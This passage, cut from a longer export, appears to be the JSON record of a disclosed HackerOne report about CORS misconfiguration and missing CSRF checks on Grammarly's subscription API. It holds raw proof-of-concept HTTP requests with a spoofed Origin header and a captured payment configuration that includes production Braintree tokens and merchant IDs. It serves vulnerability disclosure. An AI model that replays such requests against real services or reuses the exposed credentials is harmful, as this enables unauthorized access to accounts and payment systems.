      "message": "Hello security team!\n\nI additionally found some more endpoints that do not check CSRF token and trust the http protocol in CORS:\n* \n```http\nPOST /api/v1/token/create HTTP/1.1\nHost: subscription.grammarly.com\nConnection: close\nContent-Length: 0\nOrigin: http://account.grammarly.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\nAccept: */*\nReferer: https://account.grammarly.com/subscription\nAccept-Encoding: gzip, deflate\nAccept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: { cookies }\n```\n\n*  \n```http\nGET /api/v1/token/request/s7kKzj0zE02N02rgbxYg HTTP/1.1\nHost: subscription.grammarly.com\nConnection: close\nOrigin: http://account.grammarly.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\nAccept: */*\nReferer: https://account.grammarly.com/subscription\nAccept-Encoding: gzip, deflate\nAccept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: { cookies }\n```\nThese are chained queries to generate some variables to get data for payment. \n```\n{\"version\":2,\"authorizationFingerprint\":\"3395f621a8c2f85f2154d14e1974707cf9fcfee053f33896404b43302e99a154|created_at=2019-06-27T04:49:55.153164041+0000\\u0026merchant_id=68r2vzdxyjwst8d7\\u0026public_key=929973qrr27jqj8y\",\"configUrl\":\"https://api.braintreegateway.com:443/merchants/68r2vzdxyjwst8d7/client_api/v1/configuration\",\"graphQL\":{\"url\":\"https://payments.braintree-api.com/graphql\",\"date\":\"2018-05-08\"},\"challenges\":[\"cvv\",\"postal_code\"],\"environment\":\"production\",\"clientApiUrl\":\"https://api.braintreegateway.com:443/merchants/68r2vzdxyjwst8d7/client_api\",\"assetsUrl\":\"https://assets.braintreegateway.com\",\"authUrl\":\"https://auth.venmo.com\",\"analytics\":{\"url\":\"https://client-analytics.braintreegateway.com/68r2vzdxyjwst8d7\"},\"threeDSecureEnabled\":false,\"paypalEnabled\":true,\"paypal\":{\"displayName\":\"Grammarly.com\",\"clientId\":\"ASD3CyT-TxnfUa4Bkj3qak64pqtBaB1Zmbuu5TIvMAE3CZjkiTaRcoW3nF62UeAg5pIUzWqXHqcdXjMR\",\"privacyUrl\":\"https://www.grammarly.com/privacy-policy\",\"userAgreementUrl\":\"https://www.grammarly.com/terms\",\"baseUrl\":\"https://assets.braintreegateway.com\",\"assetsUrl\":\"https://checkout.paypal.com\",\"directBaseUrl\":null,\"allowHttp\":false,\"environmentNoNetwork\":false,\"environment\":\"live\",\"unvettedMerchant\":false,\"braintreeClientId\":\"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW\",\"billingAgreementsEnabled\":true,\"merchantAccountId\":\"grammarly\",\"currencyIsoCode\":\"USD\"},\"merchantId\":\"68r2vzdxyjwst8d7\",\"venmo\":\"off\",\"braintree_api\":{\"url\":\"https://payments.braintree-api.com\",\"access_token\":\"production_gwjrwx_hnx7tr_66rjsf_74sgts_dw4\"}}\n```\nIt seems that the theft of the data does not pose any security risk. But anyway, this is another example of CORS misconfiguration and without checking the CSRF token.\n\nI hope this will help you.",
      "automated_response": false,
      "created_at": "2019-06-28T04:40:27.719Z",
      "updated_at": "2019-06-28T04:40:27.719Z",
      "actor": {
        "username": "orlserg",
        "cleared": false,
        "verified": false,
        "url": "/orlserg",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/344/557/e52419d580024b46dfc518300c1293bb341bc0e8_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5673907,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Hey @orlserg,\n\nThis should be fixed now. Can you try to repro the PoC again?\n\nThanks for the report!",
      "automated_response": false,
      "created_at": "2019-08-27T12:43:08.842Z",
      "updated_at": "2019-08-27T12:43:08.842Z",
      "actor": {
        "username": "gr_triage",
        "cleared": false,
        "verified": false,
        "url": "/gr_triage",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "orlserg",
        "url": "/orlserg"
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5699830,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Looks good now. Good job.",
      "automated_response": false,
      "created_at": "2019-08-30T17:20:33.534Z",
      "updated_at": "2019-08-30T17:20:33.534Z",
      "actor": {
        "username": "orlserg",
        "cleared": false,
        "verified": false,
        "url": "/orlserg",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/344/557/e52419d580024b46dfc518300c1293bb341bc0e8_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 6173235,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "Hey @orlserg, it is a great report, let's disclose it!",
      "automated_response": false,
      "created_at": "2019-10-30T13:21:44.506Z",
      "updated_at": "2019-10-30T13:21:44.506Z",
      "first_to_agree": true,
      "actor": {
        "username": "gr_triage",
        "cleared": false,
        "verified": false,
        "url": "/gr_triage",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 6178743,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2019-10-31T03:57:12.093Z",
      "updated_at": "2019-10-31T03:57:12.093Z",
      "actor": {
        "username": "orlserg",
        "cleared": false,
        "verified": false,
        "url": "/orlserg",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/344/557/e52419d580024b46dfc518300c1293bb341bc0e8_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 6178744,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2019-10-31T03:57:12.188Z",
      "updated_at": "2019-10-31T03:57:12.188Z",
      "actor": {
        "username": "orlserg",
        "cleared": false,
        "verified": false,
        "url": "/orlserg",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/344/557/e52419d580024b46dfc518300c1293bb341bc0e8_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}